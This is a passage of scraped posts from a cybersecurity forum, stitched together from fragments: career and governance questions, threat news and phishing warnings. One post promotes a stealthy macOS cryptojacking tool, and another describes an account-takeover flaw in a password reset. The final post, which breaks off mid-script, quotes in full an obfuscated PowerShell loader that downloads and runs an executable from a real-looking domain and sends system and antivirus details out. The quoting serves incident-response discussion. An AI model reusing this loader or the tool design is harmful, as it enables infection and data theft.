\u2018Precision-Validated Phishing.\u2019 This new technique uses real-time email validation through either validation service API calls or JavaScript code to ensure phishing content is shown only to pre-verified, high-value targets. If an invalid target is identified, they are either presented with an error message or directed to benign sites. Email security firm Cofense said this new tactic is blocking visibility for researchers who typically enter fake or controlled email addresses to map the credential theft campaign. Ultimately, this reduces detection rates and prolongs the lifespan of phishing operations.  \n([Bleeping Computer](https://www.bleepingcomputer.com/news/security/phishing-kits-now-vet-victims-in-real-time-before-stealing-credentials/))\n\n**Nissan Leaf cars can be hacked for remote spying and physical takeover**  \nResearchers at PCAutomotive, a pentesting and threat intelligence specializing in the automotive and financial sectors, services industries revealed the hacking potential last week at Black Hat Asia 2025. Focusing on the second generation Nissan Leaf made in 2020, they were able to \u201cuse the infotainment system\u2019s Bluetooth capabilities to infiltrate the car\u2019s internal network. They were then able to escalate privileges and establish a C&C channel over cellular communications to maintain stealthy and persistent access to the EV directly over the internet, up to and including being able to control the steering when while a car was in motion.  \n([Security Week](https://www.securityweek.com/nissan-leaf-hacked-for-remote-spying-physical-takeover/))\n\n**kiraBot campaign uses OpenAI-generated spam, bypassing CAPTCHA**  \nResearchers at SentinelOne are describing \u201can artificial intelligence powered platform called AkiraBot being used to spam website chats, comment sections, and contact forms to promote dubious SEO services such as Akira and ServicewrapGO. In a conversation with The Hacker News, the researchers describe the procedure as \"using OpenAI to generate custom outreach messages based on the purpose of the website.\" What distinguishes this technique is its ability to craft content such that it can bypass spam filters.  \n([The Hacker News](https://thehackernews.com/2025/04/akirabot-targets-420000-sites-with.html))",

    "text": "Azure Goverance. Hello fellow cybersecurity GRC folks! I am banging my head against the wall trying to figure out the best route for Azure governance. I was recently hired to a large org that has not been the best at Azure governance, and I have taken the task of creating our processes for the governance. I have been in the GRC field for 15 years, but I previously worked with Cloud Engineers who were able to set things up and hand over the reins to me when they were done. \n\nWhat I am trying to do is use Purview with Defender for Cloud as our platform for the governance. The issue is that I have no idea how to use either. I have used Compliance Manager in the past and am familiar with the assessment processes but that is the extent of my knowledge. I tried to find a class on Udemy but the only one I found focuses on Data Governance, which is important of course but doesn't help me with the bigger picture. \n\nDoes anyone utilize these products for their Azure governance? If so, could you give some insight on your overall process for reviewing and maintaining compliance within the two? Or, I am all about learning from any legitimate sources so if anyone has any recommendations on where I could learn from that would be awesome as well.

Hi, I was recently affected by a sophisticated malware campaign specifically targeting developers and tech professionals through LinkedIn messages. Given the potential impact on this community, I wanted to share what I found.\n\n# \ud83d\udea9 Overview of the Attack:\n\n* **Social Engineering via LinkedIn:** Attackers convincingly pose as recruiters, engaging developers via direct messages.\n* **Malicious GitHub Repositories:** Targets are directed to seemingly legitimate GitHub repositories, such as `sol-decoder2024/decoder-alpha`, specifically the file located at `config/ps.config.js`, containing malicious obfuscated JavaScript. The malware activates through a simple `npm install`.\n* **Technical Details:** The scripts gather OS and user info, establish communication with a remote Command-and-Control (C2) server, download payloads, and execute further malicious activity. The obfuscation involves XOR and Base64 encoding, making detection challenging.\n\n# \ud83d\udee0\ufe0f How to Identify & Respond:\n\n* **Kill suspicious Node.js processes:** (`ps aux | grep node` on Unix, Task Manager or PowerShell on Windows).\n* **Remove malicious directories/files** in your home folder (e.g., latest created hidden directories \u2014 you can check with `ls -lat ~`).\n* **Check persistence mechanisms:** (cron jobs, `.bashrc`, Task Scheduler entries).\n* **Run thorough antivirus scans**, and if you're concerned about credential compromise, reset sensitive passwords immediately.\n\n**If you have a reliable backup strategy, it's even better to wipe your system completely and restore from a previous, clean state. I personally took this approach and am quite happy now.**\n\nStay vigilant\u2014LinkedIn's trust network makes these attacks particularly insidious. Happy to answer any questions or provide further details.\n\nThanks to the mods for quickly approving this post despite my low karma\u2014I appreciate the community support!",

As we anticipate the forthcoming updates to the HIPAA Security Rule, I'm reaching out to the compliance, InfoSec, and healthcare IT communities for valuable insights. One of the significant proposed changes revolves around the new requirement in \u00a7164.308(a)(1) for a thorough Technology Asset Inventory and Network Map. This entails documenting all technology assets involved in creating, receiving, maintaining, or transmitting ePHI, accompanied by detailed data flow mappings and interconnectivity details.\n\n\ud83d\udd0d Key requirements to note:\n\n\\- Comprehensive written inventory of all \"relevant electronic information systems\"\n\n\\- Network diagrams illustrating ePHI creation, storage, and transmission points\n\n\\- Annual updates and reviews\n\n\\- Inclusion of indirect systems such as Active Directory, DNS, etc.\n\n\ud83d\udccc My query to this community:\n\nHow are you managing the enhanced data mapping and asset inventory expectations outlined in the proposed 2025 HIPAA Security Rule?\n\nAre there specific platforms or frameworks being utilized (e.g., CMDB integrations, NIST SP 800-53 overlays, automated asset discovery)?\n\nHow are these requirements being harmonized with existing risk analysis, business continuity, or vulnerability management initiatives?\n\nAny insights gained from mock audits or readiness assessments?\n\n\n\nExcited to understand how peers in the sector are addressing this transition\u2014especially those within covered entity or hybrid environments.",

I joined around 8 months ago while still pursuing my undergrad in BTech CSE (graduating in 2025). During this time, I've been exposed to a wide variety of alerts across multiple clients \u2014 some are false positives, some need escalations to IR, and others are legitimate threats. However, I\u2019m running into a wall.\nI feel like I\u2019m just reacting to alerts without truly understanding them. I don\u2019t have the foundational understanding of systems, infrastructure, and processes that cause the alerts that i am supposed to triage. And since our training didn\u2019t cover the real-world stuff I\u2019m facing daily, I\u2019m left feeling overwhelmed and underprepared.\nFor example:\nEndpoint alerts: I struggle to understand what certain Windows processes are, what they\u2019re supposed to do, and what makes their behavior suspicious.\nCloud-related alerts: I lack clarity on cloud infrastructure and services, so alerts related to Azure or other cloud platforms don\u2019t make full sense to me.\nIdentity-based alerts (Azure AD, DCs, etc.): I don\u2019t really understand how identity is managed, how authentication works at a deeper level, or how these systems are architected.\nBasically, I can read alerts and follow runbooks, but I don\u2019t truly understand the root cause or architecture behind the incident \u2014 which leaves me feeling ineffective and disconnected.\nI dont undderstand how logs from log sources are navigated to SIEM etc. And how SOAR playbooks are configured for automation. This half knowledge is taking me nowhere.\nAlso, with AI playing a larger role in SOC operations \u2014 I\u2019ve been hearing a lot about how L1 analyst roles are at risk of being replaced with automated triage systems. I totally get that, and it\u2019s part of the reason I want to evolve.\nI want to ask:\n1. How can I gain a deep, end-to-end understanding of security foundations being in MDR?\n2. Should I continue in the SOC space and transition into engineering roles from here? If yes what skills would help me in transition from this role to more of engineering roles?\n3. Or should I consider doing a Master\u2019s to help with that transition to engineering roles?\n4. Are there resources, paths, or mentors you\u2019d recommend to learn about all aspects of security foundations?\n5. Are there paths where cybersecurity and AI intersect that I can start learning?\nI don\u2019t want to be someone who just \u201ccloses tickets.\u201d I want to know how everything works \u2014 and eventually contribute to engineering these systems, not just reacting to them.\n\nAny help or direction would mean a lot. \nThanks a lot for reading \ud83d\ude4f",

Disclaimer: I don't want to run my own SIEM as I'm not a SOC analyst and I'm not paid to be 24/7, but my boss insists on running a free SIEM just because it doesn't cost any money. He knows that I won't be tuning the SIEM.\n\nWe're a team of 6, managing 200 servers and 600 clients.\n\nMain purposes are network troubleshooting, basic alerting and basic forensics going back a week or two. We're not trying to detect adversaries in real time (I've made sure to tell my boss that very thoroughly), they just want some syslog from their firewalls and logs from AD, they couldn't spell out Sysmon if I asked them to. It should be easy to patch by a network engineer with limited Linux experience who can read a step-by-step.\n\n* They've \"heard\" good things about Elasticsearch, so just the basic ELK stack with no frills.\n* I would personally rather prefer Wazuh to get more security-focused features included\n* Security Onion kind of includes the best of both worlds there, but it does contain a lot of moving parts plus some custom dependencies on top\n\nI want to hand the daily ops of the platform to the network engineers (my boss + his greybeard friend), but I want them to feel like they own it, so trivial questions won't get forwarded to me. I do feel like that rules out Wazuh, unless someone can tell me that the Wazuh Dashboards vs Kibana user experiences are almost identical. I somewhat also feel like this rules out Security Onion, as it's more of a black box, and includes more than what they asked for and understand. My own preference would probably be Wazuh > Security Onion > ELK, but I know that a barebones ELK installation is probably the easiest to troubleshoot and get help for.\n\nI haven't spent much time testing, as I'm kind of dissolutioned with the fact that we have no business running our own SIEM when we won't even be watching it.

Got a question regarding vehicular protection, particularly for the Fate of the Furious fans. \n\nReferring to the scene where Cipher hacks the cars and runs them off of buildings: is that likely to ever happen IRL? For those who haven't seen it: [The Fate of the Furious | Raining Cars Scene in 4K HDR](https://www.youtube.com/watch?v=kToFKqsCVLQ)\n\nWhen I saw this scene, I knew instantly that I wanted to go into vehicular cyber protection. Always wanted to become a mechanic, but that isn't feasible due to a few disadvantages including cars being more computer than car these days. With Teslas being self-driving now, and many vehicles offering in-unit Wi-Fi, I can see possibilities of this on the horizon. If I start studying for this (i.e., both auto and cyber fields) now (graduate in 4 years) would the demand be likely to increase for these kinds of specialists? Do these specialists exist at all?\n\n  \nTIA!",

    "text": "AI-Powered Malicious URL (Website) Detection. Hi,\n\nLately, I've been quite concerned about how quickly convincing fake websites can be created, especially with the rise of accessible AI. The barrier for bad actors to spin up believable storefronts or crypto sites is dropping rapidly, often using aged domains and sophisticated fake online footprints. This shows we need faster, more sophisticated ways to identify these threats rather than just relying on blacklists.\n\nFeeling like we might be falling behind, I've been tinkering with a very basic online service that uses AI to analyze URLs and try to raise red flags. It currently looks at various aspects of the website's code and content, including HTML structure, JavaScript, text patterns, the age of the domain, and basic image analysis. If you're curious to see it, you can search for \"urlert\".\n\nHonestly, it's a very early attempt and far from perfect. The AI still gets tricked sometimes. I'm not claiming this is groundbreaking, but I feel a growing urgency to find better ways to detect these threats faster.\n\nI'd appreciate your thoughts on this general approach and any initial feedback you might have. Critical feedback is welcome, as long as it's offered in a respectful manner. Specifically, I'm curious about:\n\n1. What key indicators of malicious intent on a website do you think an AI should prioritize learning to identify?\n2. What are some of the biggest challenges you foresee for an AI trying to accurately detect these sophisticated fake sites?\n\nI'm really here to learn and improve this based on your expertise. \n\nThank you for lending me your time and insights.",

    "text": "Advice on Master's in Cybersecurity \u2013 CGPA 3.0, OT Security Experience, Limited Financial Resources. Hi everyone,\nI\u2019m looking for some guidance on pursuing a master\u2019s degree in cybersecurity, specifically applied cybersecurity or something closely related. Here\u2019s a bit about me:\n\nBackground: I recently completed my undergrad in Electrical Engineering from NUST (Pakistan), with a CGPA of 3.0/4.0.\n\nCurrent Role: I\u2019m currently working as an OT Cybersecurity Engineer, mainly focused on securing industrial control systems and critical infrastructure.\n\nExperience: I\u2019ve got a decent hands-on background, including applying machine learning to security problems (my final year project was a smart signature verification system using TensorFlow Lite, which won a cash prize and got good traction).\n\nGoals: I\u2019d like to pursue a master's that would open doors for consultancy and managerial roles in cybersecurity, ideally in Europe or Canada. I\u2019m also considering applying for Erasmus Mundus.\n\nFinancial Situation: I\u2019m from a modest financial background, so fully-funded or scholarship-based programs are a priority for me.\n\n\nGiven my CGPA isn\u2019t stellar, I\u2019m a bit unsure about what programs to aim for and how to strengthen my application.\n\nQuestions:\n\n1. Are there any Erasmus Mundus programs that might be realistic for my profile?\n\n\n2. Would work experience in OT security help compensate for the CGPA?\n\n\n3. Any recommended countries or programs that are open to mid-range GPAs but value work experience and offer financial aid or scholarships?\n\n\n\nWould love to hear from anyone who's been in a similar situation or has insights into master's admissions in this space. Thanks in advance!\n",

Seemed simple enough for a former developer, aside from the eternal headache of dealing with dates and times. \n\nSo I get into it, and immediately run into issues of ambiguity because, ya know, each department is autonomous so security, devops, and engineering all run things they way they want. I decide I'll just go based on engineering's true source of truth -- version control -- not they're \"meets standards\" platform. Sure, over 800 repositories exist but only around 400 are actively maintained now, so a little over 50% are archived now, but weren't five years ago. I need everything that was active, we'll deal with the archived cruft later.\n\nGetting the last commit for a given time window proved to be a fun challenge. \n\nThen came the real problem -- I only had the 400ish repos locally, and needed the other 400ish repos as well. New hurdle -- github rate limits clone requests so I can only pull four repositories every three-ish minutes before requests completely fail due to network timeouts. This shouldn't be a problem as I should be able to turn off rate limiting for the ten minutes it would take me to do my mass clone, right? Wrong. IAM (yet another dept) has removed my god access on github, and I'm assuming devops runs the show now. So, time is still the enemy.\n\nThis shouldn't be as difficult as it has become. Difficult isn't the right word, it's more gruelingly tedious.\n\nOnce I have all the repos, I'll be dumping a bunch of metadata into a handful of database tables that I'll then be able to build an API around to query all kinds of statistics to prove security sucks because no one has taken anything security has said seriously for years since before I came into this role, and they need to pay me more as a show of gratitude for having a former software dev be the appsec guy.\n\nTL:DR; building a whole f'ing app to justify my existence in a week's time is not what I signed up for, friends became enemies as soon as I dinged their egos, and why is a security guy building an app again? Oh, no budget for real tools. \u253b\u2501\u253b\ufe35 \\\\(\u00b0\u25a1\u00b0)/ \ufe35 \u253b\u2501\u253b\n\nEOF",

    "text": "SOC Analyst Inquiry: Part 2. I made a post the other day asking which SIEM certification I should go with; Splunk, SC-200 or Cisco\u2019s Security Associate. \n\nI want to thank every one who provided me their opinions. I greatly appreciate it. It seemed that most people who responded went with Splunk but SC-200 was a close second. I saw a couple of comments that stated that Cisco was definitely a no go for security. I think out of the three, I\u2019m going to do both Splunk and SC-200. Too much knowledge is never a bad thing right?\n\nAfter thinking of all this and my career end goal, which is security engineering within cloud or DevSecOps, I forgot to add the AWS Security Specialty certification to the poll. Now, this isn\u2019t a certification one would typically get for a Security Operations Analyst role, but I\u2019m wondering\u2014would being familiar with AWS security be a good thing for a SOC analyst, or is that going a bit overboard? For those of you who are in SOC or cloud security, how often do you deal with AWS security? Is your environment one of AWS, Azure, Google Cloud, multi-cloud, hybrid, or do you use a lot of third party security solutions. \n\nSorry for the 21 questions. I\u2019m trying to get all my ducks in a row so I have a clear path and don\u2019t deviate. I want to hit my career end goal by the time I\u2019m 45. I\u2019m 39 now. And for those of you who didn\u2019t read my prior post; I\u2019m not getting into cybersecurity blindly. I\u2019ve been in IT for several years and have experience with things that fall under the security umbrella. I have configured firewalls and VPNs (with minimal help from network engineers) I have configured security settings within Windows and Azure. I have done IAM at a tier 1 level and administrator level (AD, Entra ID and Okta). I have also dealt with governance, risk and compliance (HIPAA). I also educate end users on best practices around phishing, account management and password storage. \n\n",

Hey folks,\n\nI've been diving deep into macOS internals and threat modeling recently, and as part of my learning, I built an **macOS cryptojacking malware**. This tool is purely for research and red team training. It demonstrates how threat actors might attempt to mine cryptocurrency on macOS systems without user consent \u2014 useful for blue teams to understand, detect, and prevent.\n\n**Core Features:**\n\n* **Cross-architecture support**: Includes binaries for both Intel (x64) and Apple Silicon (arm64).\n* **Stealth operation**: Designed to run quietly in the background with:\n   * **Low CPU usage thresholds** to avoid raising system alerts\n   * **No user interface**, making it invisible during normal system use\n   * **Mimicking legitimate apps** (e.g. inside `TotalAV.app`) to blend in with trusted software\n* **Persistence**: Simulated techniques for autostarting on boot using macOS-specific launch agents or scripts.\n* **Crypto mining**: Demonstrates how background Monero mining might be configured on a victim system.\n* **Configuration file injection**: Shows how settings can be embedded directly into hidden config paths.\n\n**Disclaimer:**  \nThis project is intended strictly for **educational, ethical hacking, and cybersecurity research**. Do not use it on machines you do not own or have explicit permission to test.

    "text": "VPN and SSH overlapping uses confuse me. I'm kind of confused between SSH and VPN. It seems like both can do the same job. What sets them apart? Like what use cases one technology can't do without the other.\n\nMy understanding is that with a VPN you become part of the network and can use your machine/client as if you were inside that network. With SSH, the main concept is a single \"host to host\" connection, but the confusion is that you can use that host connection to also have interaction with the network that host is on and its resources.\n\nAlbeit, everything will be limited to that host, you can still send resources from your computer to the host and then to other hosts on that private network, this seem like applying the concept of remote private network connection. Sure it's quite impractical than having your own machine being part of the network, though it doesn't seem to me that SSH can't be used to achieve the same thing.\n\nOh also, SSH has extended uses beyond sending commands like file transfers, remote graphical desktop, and even routing client traffic which also causes me to go nuts as what really can't be achieved without the other. Practicality as an issue is what I could think of.\n\nI'm still learning, and I believe I don't see the whole picture or how a certain IT setup would result in using one more than the other. Also being someone who self-host, essentially most technologies seem overlapping when they achieve the same thing for me, and my tolerance is a bit high for impractical setups which causes oversight around a lot of things.",

Does this kind of consolidated view (CVEs + Breaches + Ransomware Intel + EOLs + News) actually sound helpful for your day-to-day, or does it just add\u00a0another\u00a0dashboard to check?\n2. From your professional viewpoint, what are the\u00a0must-have\u00a0data sources or specific intel types you'd absolutely need in a tool like this? Anything critical I'm likely overlooking?\n3. Any immediate red flags or potential pitfalls you see with trying to aggregate these different streams?\n\nAppreciate any thoughts or reality checks you can offer. Trying to see if this actually solves a real pain point or if I'm just creating a solution in search of a problem.\n\nCheers.\n\n",

    "text": "The Reality of Breaking Into Cybersecurity Is Starting to Hit People. I got interested in cybersecurity and IT around 2019 after listening to the *Jeremy from Marketing* episode of Darknet Diaries. That episode hooked me. At the time, I was working in a completely different industry but decided to pivot into tech. It ended up taking me almost two years to land my first entry-level IT role with zero experience, but I stuck with it because I was genuinely interested.\n\nPart of that interest probably came from my dad, he's been in IT my whole life. Funny enough, when I was younger, I wanted nothing to do with what my parents did, so I went a completely different route. Just classic youthful rebellion. Honestly, I regret not following his lead a lot sooner.\n\nSomething I\u2019ve noticed lately: this subreddit has over 1.2 million members, which is insane. I see tons of people trying to break into the industry, and students asking for advice across multiple subreddits, including this one. But lately, I\u2019ve noticed reality setting in for some. They\u2019re realizing it\u2019s not a fast track to a six-figure salary, and that it takes more time and effort than they expected. I\u2019m curious what those numbers looked like pre-COVID. I found an old growth chart showing a spike around 2020, but the current numbers don\u2019t seem accurate, so I\u2019m not sure how reliable it is. If anyone has better data, I\u2019d love to see it. Anyway, a clear shift happened around the time work-from-home became commonplace, and I suspect a lot of the growth is from people trying to move into whatever field feels hot right now.\n\nAfter that Darknet Diaries episode, I knew there was no way in hell I\u2019d be ready for a pentester or even a security role in just a couple of years. That story made it clear to me that a deep understanding of technology, along with experience, is needed. And while there\u2019s been a flood of cybersecurity influencers and bootcamps since then, I realized early on that a lot of it was just people capitalizing on the hype. I just so happened to get interested right before that same wave, but I never once thought that passing Security+ or just having an interest would make me job-ready. Honestly, it made me realize how much I *didn\u2019t* know.\n\nWe\u2019re in a weird time now, but maybe that\u2019s a good thing. It\u2019s starting to separate the people who are actually into this field from those just chasing a hot trend. If you stick with it, stay curious, and don\u2019t get discouraged by the job climate, I think you\u2019ll be in a good position when things rebound\u2014whatever that ends up looking like.",

    "text": "Discovered a Critical Password Reset Vulnerability in a Public Service App ; Need Advice on What to Do. Hey folks,\n\nI came across a serious flaw in the password reset flow of a public-facing service app; not naming the app for obvious reasons. I\u2019m looking for advice on how to handle this responsibly without crossing legal or ethical lines.\n\nHere\u2019s the situation:\n\nThe app has two options for resetting a password:\n\n1. A secure method involving a unique ID tied to the user.\n2. A weaker method using a combination of username and registered email.\n\nThe issue? The second method doesn\u2019t properly validate the username. If someone enters the **same email address** in both the username and email fields, the system directly gives access to a password reset page, no OTP, no verification step.\n\nThat means anyone who knows a registered email address can:\n\n* Reset the password for that account.\n* Log in and fully take over the account.\n* Lock out the original user.\n\nTo verify this, I created two separate accounts on different devices and tested this against my own emails. It worked every time. I didn\u2019t go beyond testing on my own accounts, no unauthorized access or malicious intent.\n\n**Here\u2019s what an attacker would gain access to upon account takeover:**\n\n* The user\u2019s **unique ID**\n* Their **registered phone number**\n* **Full legal name**\n* **Full home address**\n\nShould I just leave it as is?\n\nAll of this is available post-login.\n\nAppreciate any insight from others who\u2019ve dealt with similar situations.\n\nThanks!",

The issue with this is we don't have any governance, visibility or protection on those virtual environments, as they lack EDR, SWG, SIEM agent, etc. I have some ideas regarding virtual machines running on virtual box or users with WSL, but with devs running local docker instances I'm not so sure about what's the right way to handle it. Security-wise, the easy thing would be not to allow them to run docker locally and just force to use dev environment, but it's obvious that the business would not agree on that, it would slow down delivery times and make devs day-to-day job more difficult in comparison to current situation.   \nI want to know how are you taking care of this risk on your orgs, and if you found that holly sweet spot which security and business can be comfortable with.

Honestly if you\u2019re not paying close attention it\u2019s way too easy to fall for it.\n\nI\u2019ve been reading up on it and here are a few red flags to watch for:\n\nAlways double check the url. Real microsoft login pages will be on domains like login.microsoftonline.com. If it looks sketchy or has weird extra words back out.\n\nLook for subtle design errors. Some of these fakes are super close but they\u2019ll sometimes use outdated branding or slightly off colors.\n\nWatch for unexpected login prompts. If you randomly get redirected to a login screen and you weren\u2019t trying to access anything don\u2019t log in. That\u2019s a big one.\n\nEnable mfa. Even if your password gets phished mfa gives you a second line of defense.\n\n\nScary part? These are getting good enough that even IT folks are second guessing them.

I am mainly responsible for HIPAA training programs, policy oversight, compliance investigations, and various audits of our facilities. I also assist with some security aspects for third party risk management. I have only been in this position for four months, and my salary is 90k, with a potential for up to 8% bonus. The downside is that I have to commute through very heavy traffic four days a week, about 2-2.5 hours total per day. \n\nIn my last job (I was there for two years), I had more of a GRC related role. My title was \u201ccompliance analyst\u201d, and I worked for a healthcare tech startup. I competed hundreds of technical SIG questionnaires and assisted with evidence gathering for SOC 2 and HITRUST audits. I became very familiar with NIST as well. I miss doing that type of work, but I\u2019d also be open to doing a more technical security analyst role. Currently I am enrolled in a 5-month cybersecurity certificate program, and also preparing for Security+. And finally, I have a masters in health information systems. \n\nI was just offered an interview for a GRC analyst /hybrid position that pays 70-90k. Given my current compensation, I would not accept less than 90k. The position is with a law firm. I have thought about doing the interview, but am thinking if I hold out a bit longer at my current job, gain some more experience here, and finish my certifications, I might be able to get a better salary? I also just have concerns about leaving my current role after only four months\u2026but I know GRC jobs can be hard to come by. Any thoughts would be appreciated!!",

    "text": "Found an interesting article on Smishing Triad scam used for stealing credit card details.. Just wanted to share something I found out while digging into some recent phishing scams. I have a background in cybersecurity and earned my Masters of Science in Cybersecurity a couple years ago. I have been working in IT for over 20 years and thought I had seen it all but this one really caught my attention.\n\nI came across this post on KrebsOnSecurity from April 10.\n\nThis talks about a China-based scam network called the Smishing Triad. What happens is that they will send out fake texts pretending to be toll road payment systems or delivery companies. THis will include, unpaid toll fees or a package that could not be delivered. The message tells you to click a link to fix the problem.\n\nHowever, what caught my eye is how these are semi-relistc in a sense. These scammers are creating fake websites that look exactly like USPS or your credit card company. People are entering their card info and not realizing it's fake (as a cybersecurity professional, I would recognize these fake websites - but to the average person it would be challenging for them). The worst part about this is that once they get the victims information, they load the credit card into a Google Wallet or Apple Pay account on a device they control. They can use it to make purchases in stores or online. They want to use it fast and get the most out of it before anyone notices.\n\nI\u2019d I wanted to this share since a lot of these fake messages can look pretty convincing. And they\u2019re hitting people all over the US UK and even Australia. Watch out for anything saying \u201cpay now\u201d or \u201cverify your card\u201d through a link in a text. And if the message has typos or weird grammar. That\u2019s usually a red flag.",

Just last month, I posted about the Medusa Ransomware Gang and their aggressive tactics, and it didn't take long for new victims to show up on their growing list. The gang claims to have breached the systems of NASCAR (yes, the National Association for Stock Car Auto Racing), stealing over 1TB of data and demanding a $4 million ransom for its deletion.\n\nAccording to Medusa's dark website, the group has put a countdown timer at the top of the page, threatening to release the stolen data when time runs out(unless NASCAR pays $100,000 daily to delay the clock). The gang has also shared screenshots that show internal NASCAR documents, employee and sponsor contact details, invoices, financial reports, and more. They've also published a sizable directory structure listing exfiltrated files.\n\nOfficially, NASCAR hasn't confirmed or denied the breach, but the evidence Medusa is putting forward looks fairly credible. Since June 2021, Medusa ransomware has been confirmed to have compromised over 300 organizations across critical infrastructure sectors,\u00a0including medical, education, legal, insurance, technology, and manufacturing.\u00a0",

    "text": "Fake \"Delivery Status Notification (Failure)\" emails sent to Gmail users with viral image link. I\u2019m sharing with reddit cybersecurity community about a sly cyberattack some might be familiar with. Scammers are sending fake \"Delivery Status Notification (Failure)\" emails that seem to come from Google, with embedded images or links leading to malicious sites. Clicking these could compromise accounts or device. \n\nI noticed it comes with some sort of fake image embedded inside the email which seems genuinely coming from Google Mail servers as a delivery failure but the image when I tap and hover over it to see the link points to a viral link embedded within the image link. See screenshots via link below. Its onky recently someone has started these to Gmail users. Is it because they don't have SPF or DMARC or DKIM antispam settings in place? \n\nHere\u2019s my sequence \n\n1. Don\u2019t Click: Avoid engaging with links or images in suspicious emails.\n2. Check the Sender: Hover over the email address to confirm it\u2019s legitimate (e.g., ends in @google.com, not @googlemail.com).\n3. Monitor Your Gmail Account: Visit the security tab in your Google Account settings to check for recent activity, unfamiliar devices, or strange apps.\n4. Report It: Use the Gmail app or website to report the email as phishing (click the three dots in Gmail and select \"Report phishing\").\n5. Scan Your Device: If you clicked anything, run an antivirus scan immediately.\n6. Secure Your Accounts: Update passwords and enable two-factor authentication if you entered any details.\n\nDoes Google use SPF, DKIM and DMARC anti spam protections to their Gmail servers to protect users? I reported it to them and sent them a suggestion to activate these protections if they don't already have it.\n\nHave you seen similar scams? \n\nAttached are screenshots of the attacks and the links that came embedded in the image pointing to viral sites!

A wacatac malware downloaded by the script was quarantined, and a full scan using Defender for Endpoint shows no more active threats\u2026 But I'm not entirely convinced the system is clean, so I\u2019m recommending a reformat just to be safe.\n\nFrom what I (and GPT \ud83d\ude0a) can understand, the script downloads and runs an .exe payload (the Wacatac) from a weirdly named domain (registered one day before execution of the script), gathers system and antivirus info, and sends it to a remote server via a POST request. It also clears the clipboard and seems to tamper with the user's RunMRU registry keys.\n\nBased on your professional experience, could you clarify some things for me?\n\n1. Why are the system and antivirus info typically collected by attackers?\n2. I think the clearing of the clipboard and messing with the RunMRU keys are only done to cover tracks, but I\u2019m not sure (especially with the RunMRU). Any other reason this could be done?\n3. Other than blocking the malicious domain referenced by the script, reviewing IDS, SIEM & Defender/EDR logs and piecing the puzzle, are there any other steps that you typically take to continue investigating?\n4. How much time do you typically allocate to investigate an incident like this? When do you stop?\n5. Is there an easy way to identify the source? From the logs, it doesn\u2019t seem obvious that the script was downloaded at the time of the incident (Maybe earlier?). \u00a0Unfortunately, USB mass storage was allowed on this device, so that could be a likely source too.\n\nHere\u2019s the full script:\n\n    $NmMfFcwX = \"h\" + \"ttps://\" + \"securi\" + \"ty.\" + \"fl\" + \"eare\" + \"g\" + \"a\" + \"urd\" + \"c.com/0B9\" + \"4\" + \"e3C4b5\" + \"A6\" + \"f7E8\" + \"d\" + \"9C0\" + \"b1A\" + \"2f3EA54\" + \"bf\"\n    function OFOisTqU {\n        $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem\n        $cpuInfo = Get-CimInstance -ClassName Win32_Processor\n        $systemInfo = Get-CimInstance -ClassName Win32_ComputerSystem\n        return [ordered]@{\n            HostName = $env:COMPUTERNAME\n            CurrentUser = $env:USERNAME\n            OSVersion = $osInfo.Version\n            OSName = $osInfo.Caption\n            CPUModel = $cpuInfo.Name\n            TotalMemoryMB = [math]::Round($systemInfo.TotalPhysicalMemory / 1MB)\n            PowerShellVersion = $PSVersionTable.PSVersion.ToString()\n            Architecture = $osInfo.OSArchitecture\n        }\n    }\n    function B7Bz0O64 {\n        $securityInfo = [ordered]@{ AVProducts = @() }\n        try {\n            $avProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct -ErrorAction SilentlyContinue\n            if ($avProducts) {\n                $securityInfo.AVProducts = $avProducts | ForEach-Object {\n                    [ordered]@{\n                        Name = $_.displayName\n                        State = $_.productState\n                        IsActive = ($_.productState -band 0x1000) -eq 0x1000\n                        IsUpdated = ($_.productState -band 0x10) -eq 0\n                    }\n                }\n            }\n        } catch {\n            Write-Output \"Failed to retrieve security details\"\n        }\n        return $securityInfo\n    }\n     \n    $aRVIsRTA = Join-Path -Path $env:TEMP -ChildPath \"bLRkHMI4.exe\"\n    $BUUvTNum = New-Object System.Net.WebClient\n    $BUUvTNum.Headers.Add(\"User-Agent\", \"loader\")\n    try {\n        $url = \"ht\" + \"tps://s\" + \"ec\" + \"u\" + \"rity.f\" + \"l\" + \"eare\" + \"ga\" + \"urdc.\" + \"c\" + \"o\" + \"m/\" + \"C\" + \"0f\" + \"7D6\" + \"b8A\" + \"5e\" + \"9C\" + \"2d\" + \"4\" + \"B\" + \"1a3E0f\" + \"8B9D31/ar\" + \"chi\" + \"ve.e\" + \"xe\"\n        $BUUvTNum.DownloadFile($url, $aRVIsRTA)\n        $nJgH6ban = @(\n            'Start-P', \n            'r', \n            'oc', \n            'es', \n            's', \n            ' -', \n            'F', \n            'ile', \n            'Pat', \n            'h ', \n            '$', \n            'a', \n            'RVI', \n            's', \n            'RTA'\n        ); \n        $script = $nJgH6ban -join ''; \n        Invoke-Expression $script\n        \n                $systemInfo = OFOisTqU\n                $securityInfo = B7Bz0O64\n                \n                $payload = @{\n                    logData = \"$(Get-Date): Process ran successfully.\"\n                    systemInfo = $systemInfo\n                    securityInfo = $securityInfo\n                    execPolicy = \"$(Get-ExecutionPolicy)\"\n                }\n                $jsonPayload = $payload | ConvertTo-Json -Depth 4\n                $BUUvTNum.Headers.Add(\"Content-Type\", \"application/json\")\n                $BUUvTNum.UploadString($NmMfFcwX, \"POST\", $jsonPayload)\n        \n     \n    } catch {\n        \n                $errorPayload = @{\n                    logData = \"Failed to start process: $($_.Exception.Message)\"\n                    systemInfo = OFOisTqU\n                    securityInfo = B7Bz0O64\n                    execPolicy = \"$(Get-ExecutionPolicy)\"\n                }\n                \n                $jsonErrorPayload = $errorPayload | ConvertTo-Json -Depth 4\n                $BUUvTNum.Headers.Add(\"Content-Type\", \"application/json\")\n                $BUUvTNum.UploadString($NmMfFcwX, \"POST\", $jsonErrorPayload)\n        \n    }\n     \n     \n    function dfP0vrgI {\n        Add-Type -AssemblyName System.Windows.Forms\n        [System.Windows.Forms.Clipboard]::Clear()\n    }\n    $MAhccWbU = $true\n    $IBDZRjcl = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU'\n    $NjcZbJi5 = 'cmd'\n    try {\n        $VCfQoOVU = Get-ItemProperty -Path $IBDZRjcl -ErrorAction SilentlyContinue\n        if ($VCfQoOVU) {\n            $QG5eAkTK = $VCfQoOVU.PSObject.Properties | Where-Object { $_.Name -ne 'MRUList' -and $_.Name.Length -le 2 } | Select-Object -ExpandProperty Name\n            $CU3vzbIB = $QG5eAkTK | Sort-Object | Select-Object -Last 1\n            if 